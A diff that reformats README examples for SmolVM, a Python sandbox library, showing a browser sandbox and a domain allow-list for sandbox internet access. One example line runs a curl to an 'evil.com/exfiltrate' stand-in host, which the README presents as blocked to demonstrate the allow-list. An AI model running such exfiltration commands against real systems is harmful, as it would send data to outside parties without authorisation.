@@ -237,8 +237,8 @@ Start a visible browser sandbox from Python:
 from smolvm import SmolVM
 
 with SmolVM.browser(headless=False) as browser:
-    print(browser.cdp_url)      # Automation endpoint for Playwright or CDP tools
-    print(browser.viewer_url)   # Web URL you can open to watch live
+    print(browser.cdp_url)  # Automation endpoint for Playwright or CDP tools
+    print(browser.viewer_url)  # Web URL you can open to watch live
     print(browser.display_url)  # VNC URL for clients or computer-use agents
 ```
 
@@ -279,12 +279,14 @@ By default, sandboxes have full internet access. You can restrict which domains 
 ```python
 from smolvm import SmolVM
 
-vm = SmolVM(internet_settings={
-    "allowed_domains": ["https://api.openai.com"],
-})
+vm = SmolVM(
+    internet_settings={
+        "allowed_domains": ["https://api.openai.com"],
+    }
+)
 
-vm.run("curl https://api.openai.com/v1/models")    # allowed
-vm.run("curl https://evil.com/exfiltrate")         # blocked
+vm.run("curl https://api.openai.com/v1/models")  # allowed
+vm.run("curl https://evil.com/exfiltrate")  # blocked
 ```
 
 See [docs/guides/networking.md](docs/guides/networking.md) for how it works under the hood.
